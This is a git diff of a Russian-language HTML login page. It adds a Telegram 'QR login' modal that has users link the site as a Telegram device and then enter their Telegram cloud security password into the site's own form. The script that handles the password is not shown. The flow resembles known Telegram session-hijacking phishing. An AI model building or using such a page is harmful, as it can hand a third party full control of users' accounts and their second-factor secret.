@@ -3,20 +3,59 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Telegram Login — redirect only</title>
-    <style>
-      body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; margin: 24px; line-height: 1.45; }
-      .box { max-width: 720px; margin: 0 auto; padding: 16px; border: 1px solid #ddd; border-radius: 12px; }
-      pre { background:#fafafa; border:1px dashed #ccc; padding:10px; border-radius:8px }
-    </style>
+    <title>Вход в Telegram: QR или Виджет</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.4.4/build/qrcode.min.js"></script>
+    
+    <link rel="stylesheet" href="/static/styles_login.css">
   </head>
   <body>
     <div class="box">
-      <h1>Вход через Telegram (redirect-only)</h1>
+      <h1>Выберите способ входа</h1>
+      <p>Используйте виджет или войдите через сканирование QR-кода.</p>
 
-      <script async src="https://telegram.org/js/telegram-widget.js?22" data-telegram-login="Loogin_register_bot" data-size="small" data-auth-url="https://607c855df1ba.ngrok-free.app/auth/telegram-widget" data-request-access="write"></script>
+      <div class="telegram-widget-wrapper">
+        <script async src="https://telegram.org/js/telegram-widget.js?22" 
+                data-telegram-login="loggign_bot" 
+                data-size="large" 
+                data-auth-url="/auth/telegram-widget" 
+                data-request-access="write">
+        </script>
+      </div>
+      
+      <div class="separator">ИЛИ</div>
+
+      <button class="qr-button" id="qr-login-btn" onclick="startQrLogin()">
+        <svg class="qr-icon" viewBox="0 0 24 24">
+          <path d="M3 3h8v8H3V3zm10 0h8v8h-8V3zM3 13h8v8H3v-8zm10 4h2v-2h-2v2zm-2-2h2v-2h-2v2zm2 2h2v-2h-2v2zm2 2h2v-2h-2v2zm-2-6h2v-2h-2v2zm-2 2h2v-2h-2v2zm6-2h2v-2h-2v2zm2 2h2v-2h-2v2zm-6 2h2v-2h-2v2z"/>
+        </svg>
+        Вход по QR-коду
+      </button>
+
     </div>
 
-    
+    <div id="qrModal" class="modal">
+        <div class="modal-content" id="qr-modal-content">
+            <span class="close-btn" onclick="closeQrModal()">&times;</span>
+            <h2 id="modal-title">Сканируйте QR-код</h2>
+            <p id="modal-description">Откройте Telegram, перейдите в Настройки > Устройства > Подключить устройство.</p>
+            
+            <div class="loading-spinner" id="qr-spinner"></div>
+            
+            <div id="qr-code-container">
+                <canvas id="qr-canvas"></canvas>
+            </div>
+            
+            <form id="two-fa-form" onsubmit="send2faPassword(event);">
+                <input type="password" id="2fa-password-input" placeholder="Пароль облачной безопасности" required />
+                <button type="submit">Подтвердить</button>
+            </form>
+
+            <div class="qr-status" id="qr-status-text">Ожидание сканирования...</div>
+        </div>
+    </div>
+
+
+    <script  src="/static/login.js"></script>
   </body>
+ 
 </html>
